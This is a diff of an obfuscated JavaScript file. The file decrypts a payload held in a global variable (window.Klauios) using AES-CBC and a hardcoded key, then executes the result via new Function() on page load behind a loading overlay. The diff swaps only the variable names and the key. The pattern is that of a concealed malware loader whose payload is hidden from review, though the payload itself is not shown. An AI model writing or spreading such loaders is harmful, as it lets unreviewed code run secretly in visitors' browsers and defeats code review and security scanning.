@@ -1,30 +1,30 @@
 const loadingOverlay = document.getElementById("loading-overlay");
-function librarys(_0x5f313d, _0x52859a) {
-  var _0x52ebd1 = forge.util.decode64(_0x5f313d);
-  var _0x5346d8 = 16;
-  var _0x1576bc = _0x52ebd1.substring(0, _0x5346d8);
-  var _0x13f934 = _0x52ebd1.substring(_0x5346d8);
-  var _0x27cfdb = forge.cipher.createDecipher("AES-CBC", _0x52859a);
-  var _0xbffab9 = forge.util.createBuffer(_0x13f934);
-  var _0x5b7306 = {
-    iv: _0x1576bc
+function librarys(_0x1822a7, _0x3f2c6c) {
+  var _0x1a1762 = forge.util.decode64(_0x1822a7);
+  var _0x3c1563 = 16;
+  var _0x5115a2 = _0x1a1762.substring(0, _0x3c1563);
+  var _0x1a3c81 = _0x1a1762.substring(_0x3c1563);
+  var _0x13e97b = forge.cipher.createDecipher("AES-CBC", _0x3f2c6c);
+  var _0x27ed35 = forge.util.createBuffer(_0x1a3c81);
+  var _0x3e6855 = {
+    iv: _0x5115a2
   };
-  _0x27cfdb.start(_0x5b7306);
-  _0x27cfdb.update(_0xbffab9);
-  var _0x1bc9ab = _0x27cfdb.finish();
-  if (_0x1bc9ab) {
-    var _0x5972cd = _0x27cfdb.output.getBytes();
-    var _0x4427a7 = forge.util.decodeUtf8(_0x5972cd);
-    return _0x4427a7;
+  _0x13e97b.start(_0x3e6855);
+  _0x13e97b.update(_0x27ed35);
+  var _0x8d370b = _0x13e97b.finish();
+  if (_0x8d370b) {
+    var _0xd114e5 = _0x13e97b.output.getBytes();
+    var _0x18e2c0 = forge.util.decodeUtf8(_0xd114e5);
+    return _0x18e2c0;
   } else {
     return null;
   }
 }
 function executeCode() {
-  const _0x32ae80 = "RVeAw7k1hrxv9pmui3yfUq8MG0OaH6QL";
-  const _0xa0953e = librarys(window.Klauios, _0x32ae80);
-  const _0x4709c2 = new Function(_0xa0953e);
-  _0x4709c2();
+  const _0x1b326a = "XghA0vNrxjSFlGziV9p1kyQEo3ms7ZID";
+  const _0x17d470 = librarys(window.Klauios, _0x1b326a);
+  const _0x3407a7 = new Function(_0x17d470);
+  _0x3407a7();
 }
 executeCode();
 loadingOverlay.remove();
